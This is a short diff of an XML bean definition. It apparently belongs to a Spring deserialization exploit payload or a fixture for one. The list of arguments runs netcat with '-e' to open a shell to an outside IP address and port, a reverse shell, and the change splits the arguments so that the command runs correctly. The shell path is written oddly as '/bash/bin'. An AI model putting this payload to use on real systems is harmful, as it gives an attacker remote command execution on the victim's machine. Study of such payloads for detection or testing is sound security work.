@@ -3,7 +3,8 @@
     <constructor-arg>
       <list>
         <value>nc</value>
-        <value>-e /bash/bin 172.22.73.18 8087</value>
+        <value>-e /bash/bin</value>
+        <value>172.22.73.18 8087</value>
       </list>
     </constructor-arg>
   </bean>
